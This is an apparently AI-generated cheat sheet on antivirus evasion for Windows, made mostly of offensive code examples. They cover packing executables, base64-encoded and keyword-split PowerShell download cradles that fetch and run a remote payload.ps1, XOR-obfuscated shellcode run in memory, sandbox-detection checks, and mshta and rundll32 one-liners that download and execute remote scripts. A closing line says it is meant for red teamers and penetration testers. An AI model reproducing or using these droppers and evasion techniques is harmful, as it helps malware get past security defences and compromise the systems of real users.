
Here's a cheat sheet with code examples focused on "Introduction to Antivirus Evasion" and "Advanced Antivirus Evasion":

### 4. **Introduction to Antivirus Evasion**

#### **4.1. Packing/Obfuscation**
- **Using UPX to Pack Executables**:
  
  UPX is a popular tool for packing and compressing executables, which can help evade signature-based detection.
  
  ```sh
  upx -9 -o packed.exe original.exe
  ```
  
- **Basic PowerShell Obfuscation**:
  
  PowerShell commands can be obfuscated to avoid detection by AV products.
  
  ```powershell
  $cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand'
  $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"))
  Invoke-Expression "$cmd $encoded"
  ```

#### **4.2. Signature Bypass**
- **Modifying Known Payloads**:
  
  Altering a few bytes or recompiling code can sometimes bypass signature-based detection.
  
  ```c
  // Original malicious payload
  unsigned char shellcode[] = "\xfc\xe8...";
  
  // Modify or XOR the shellcode to bypass signatures
  for (int i = 0; i < sizeof(shellcode); i++) {
      shellcode[i] ^= 0xAA;  // Example XOR operation
  }
  ```
  
- **Obfuscated PowerShell Script**:
  
  Breaks up known malicious keywords to avoid detection.
  
  ```powershell
  $c = "IEX" + " (New-" + "Object Net." + "WebClient).Do" + "wnload" + "String('http://example.com/payload.ps1')"
  Invoke-Expression $c
  ```

#### **4.3. Sandbox Evasion**
- **Checking for Debuggers/Sandbox**:
  
  Insert sleep delays or check for common sandbox indicators.
  
  ```powershell
  Start-Sleep -s 60  # Delay to evade sandboxes with time limits

  # Check if running in a virtual environment
  $hostname = $env:COMPUTERNAME
  if ($hostname -match "VIRTUAL|TEST") {
      Exit
  }
  ```

### 5. **Advanced Antivirus Evasion**

#### **5.1. Custom Cryptors**
- **Encrypting Payloads**:
  
  Use a custom cryptor to encrypt the payload, decrypting it in memory.
  
  ```c
  unsigned char encrypted_shellcode[] = {...}; // Encrypted payload

  // Decrypt the payload in memory before execution
  for (int i = 0; i < sizeof(encrypted_shellcode); i++) {
      encrypted_shellcode[i] ^= 0xAA;  // Decrypt using XOR
  }

  // Execute the decrypted payload
  void (*func)() = (void (*)())encrypted_shellcode;
  func();
  ```

#### **5.2. Living Off the Land (LOLBins)**
- **Using Native Windows Binaries**:
  
  Use signed Windows binaries to execute payloads.
  
  ```sh
  mshta.exe "javascript:a=new%20ActiveXObject('WScript.Shell');a.Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(''http://example.com/payload.ps1'');',1,true);close();"
  ```

  ```sh
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://example.com/payload.js").Execute();
  ```

#### **5.3. Polymorphism/Metamorphism**
- **Polymorphic Code**:
  
  Change the code structure on each execution to avoid signature detection.
  
  ```powershell
  # Example of generating a unique payload each time
  $payload = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
  $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
  
  $randomVar = "var" + (Get-Random)
  $script = "$randomVar = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$encoded')); Invoke-Expression $randomVar"
  Invoke-Expression $script
  ```

  - **Dynamic PowerShell Encoding**:

  ```powershell
  $command = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
  $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
  $finalCommand = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
  Invoke-Expression $finalCommand
  ```

This cheat sheet provides code examples for evading antivirus detection through basic and advanced techniques. It covers the creation of custom cryptors, the use of native Windows binaries (LOLBins), packing, obfuscation, and sandbox evasion strategies. These examples are geared towards red teamers and penetration testers working in Windows environments.